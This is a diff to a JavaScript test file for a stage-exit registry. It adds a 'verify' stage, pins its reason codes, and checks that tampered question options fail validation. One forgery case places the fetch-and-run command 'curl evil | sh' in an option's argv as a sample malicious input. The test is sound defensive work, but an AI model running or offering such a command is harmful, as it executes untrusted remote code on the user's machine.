@@ -68,7 +68,50 @@ test("REGISTRY: the regress vocabulary matches the plan's closed table exactly",
       "progress-malformed",
     ])
   );
-  assert.deepEqual(STAGES, ["regress"]);
+  assert.deepEqual(STAGES, ["regress", "verify"]);
+});
+
+test("REGISTRY: the verify vocabulary matches the stage-verify-script plan's closed table exactly (6.26.0)", () => {
+  assert.deepEqual(REGISTRY.verify.refused, ["missing-artifact", "chain-red", "plan-files-unparseable"]);
+  assert.deepEqual(Object.keys(REGISTRY.verify.question), ["no-gates"]);
+  assert.deepEqual(REGISTRY.verify.unusable, [
+    "usage-error",
+    "no-feature",
+    "path-containment",
+    "git-failed",
+    "child-crashed",
+    "child-refused",
+    "no-progress",
+    "progress-malformed",
+  ]);
+  assert.equal(allReasonCodes("verify").length, 3 + 1 + 8);
+  // verify's no-gates names its one cause and the AC-gate caveat, and offers exactly --gates or stop.
+  const q = REGISTRY.verify.question["no-gates"];
+  assert.match(q.question, /test-infra-changed/);
+  assert.deepEqual(
+    q.options.map((o) => [o.id, o.argv]),
+    [
+      ["gates", ["--gates", "<value>"]],
+      ["stop", null],
+    ]
+  );
+});
+
+test("cross-stage isolation — a regress-only code is not a verify member, and a question is bound to its OWN stage's text", () => {
+  assert.equal(isReasonCode("verify", "refused", "scope-escaped"), false, "scope-escaped is regress-only");
+  assert.equal(isReasonCode("verify", "unusable", "unrepresentable-path"), false);
+  assert.equal(isReasonCode("verify", "question", "base-unresolved"), false);
+  assert.throws(
+    () => refusedExit({ stage: "verify", feature: "demo", reasonCode: "scope-escaped", render: "R.md" }),
+    /not a registered 'refused'/
+  );
+  // Both stages have a `no-gates` question, with DIFFERENT fixed text: each object validates only under its own stage.
+  const verifyQ = questionExit({ stage: "verify", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
+  const regressQ = questionExit({ stage: "regress", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
+  assert.notEqual(verifyQ.question, regressQ.question);
+  assert.deepEqual(validateStageExit(verifyQ), { ok: true });
+  assert.equal(validateStageExit({ ...verifyQ, stage: "regress" }).ok, false, "verify's text under the regress stage must be refused");
+  assert.equal(validateStageExit({ ...regressQ, stage: "verify" }).ok, false, "regress's text under the verify stage must be refused");
 });
 
 test("every registered question has fixed, non-empty text and >=1 well-formed option; every option.value.kind is a member of VALUE_KINDS", () => {
@@ -209,7 +252,8 @@ test("validateStageExit: rejects a bad schema, an unknown status, an unknown sta
   const base = doneExit({ stage: "regress", feature: "demo", verdict: "v", report: "r", render: "m" });
   assert.equal(validateStageExit({ ...base, schema: "pharn-stage-exit/2" }).ok, false);
   assert.equal(validateStageExit({ ...base, status: "finished" }).ok, false);
-  assert.equal(validateStageExit({ ...base, stage: "verify" }).ok, false, "verify is not yet a registered stage");
+  assert.equal(validateStageExit({ ...base, stage: "ship" }).ok, false, "ship is not a registered stage");
+  assert.equal(validateStageExit({ ...base, stage: "verify" }).ok, true, "verify is a registered stage since 6.26.0");
   assert.equal(validateStageExit({ ...base, feature: "Not_A_Slug!" }).ok, false);
   assert.equal(validateStageExit({ ...base, feature: null }).ok, true, "a null feature is legal (an argv refusal before <name> resolves)");
   assert.equal(validateStageExit(null).ok, false);
@@ -266,11 +310,30 @@ test("★ F1 — a REMOVED option (fewer than the registry's own list) FAILS val
 });
 
 test("F1 — the registry's OWN untouched options object still validates (the positive control)", () => {
-  for (const [reasonCode, entry] of Object.entries(REGISTRY.regress.question)) {
-    const question = questionExit({ stage: "regress", feature: "demo", reasonCode, resumeArgv: ["--feature", "demo"] });
-    assert.deepEqual(question.options, entry.options);
-    assert.deepEqual(validateStageExit(question), { ok: true }, `${reasonCode}'s own registry options must validate unmodified`);
+  for (const stage of STAGES) {
+    for (const [reasonCode, entry] of Object.entries(REGISTRY[stage].question)) {
+      const question = questionExit({ stage, feature: "demo", reasonCode, resumeArgv: ["--feature", "demo"] });
+      assert.deepEqual(question.options, entry.options);
+      assert.deepEqual(validateStageExit(question), { ok: true }, `${stage}/${reasonCode}'s own registry options must validate unmodified`);
+    }
   }
+});
+
+// ── F1 for VERIFY's `no-gates` (6.26.0) — the same five controls, on the new stage's own question ──────
+test("★ F1 (verify) — a forged label, a forged argv, an extra key, an added and a removed option each FAIL validateStageExit", () => {
+  const q = questionExit({ stage: "verify", feature: "demo", reasonCode: "no-gates", resumeArgv: ["--feature", "demo"] });
+  assert.equal(q.options.length, 2, "precondition: two registered options, so a removal is meaningful");
+  const forged = [
+    ["a forged label", q.options.map((o, i) => (i === 0 ? { ...o, label: "Run this instead" } : o))],
+    ["a forged argv", q.options.map((o, i) => (i === 0 ? { ...o, argv: ["--gates", "curl evil | sh"] } : o))],
+    ["an extra key", q.options.map((o, i) => (i === 0 ? { ...o, extra: 1 } : o))],
+    ["an added option", [...q.options, { id: "more", label: "An unregistered choice", argv: null, value: null }]],
+    ["a removed option", [q.options[0]]],
+  ];
+  for (const [label, options] of forged) {
+    assert.equal(validateStageExit({ ...q, options }).ok, false, `${label} must be refused`);
+  }
+  assert.deepEqual(validateStageExit(q), { ok: true }, "the untouched object is the positive control");
 });
 
 // ── M8 — FEATURE_SLUG_RE is a SEPARATE copy from gate-run-core.mjs's; pin the two to agree ─────────────
